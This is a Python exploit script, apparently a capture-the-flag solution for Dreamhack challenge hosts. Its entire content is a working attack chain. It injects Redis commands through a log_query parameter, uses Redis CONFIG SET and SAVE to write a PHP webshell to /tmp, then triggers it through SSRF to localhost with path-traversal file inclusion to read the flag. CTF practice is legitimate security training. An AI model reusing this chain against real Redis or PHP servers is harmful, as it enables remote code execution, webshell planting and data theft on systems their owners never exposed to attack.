import requests
import re
import base64

node_url = "http://host8.dreamhack.games:18054/"
py_url = "http://host8.dreamhack.games:19620/"

# redis command injection
def redis_cmd(cmd):
    cmd = cmd.split(' ')
    req = f'{node_url}/show_logs?'

    for i in range(len(cmd)):
        if i == 0:
            req += f'log_query[0]={cmd[i]}'
        else:
            req += f'&log_query[1][]={cmd[i]}'

    res = requests.get(req)

    if res.text == 'OK':
        print("> Command succeeded")
    else:
        print("> Command failed")

# ssrf
def ssrf(url):
    res = requests.post(f'{py_url}/img_viewer', data={
        'url': url
    })

    leak = re.findall(r'img src="data:image/png;base64,(.+)"/>', res.text)[0].strip()

    return base64.b64decode(leak).decode(errors='ignore')

# write php webshell
redis_cmd('SET a "<?=`/readflag`?>"')
redis_cmd("CONFIG SET dir /tmp")
redis_cmd("CONFIG SET dbfilename shell.php")
redis_cmd('SAVE')

# file inclusion rce
leak = ssrf('http://localhost:80?page=../../../../../../tmp/shell')

flag = re.findall(r'(DH{.+?})', leak.replace("\n", ' '))[0].strip()
print("Flag:", flag)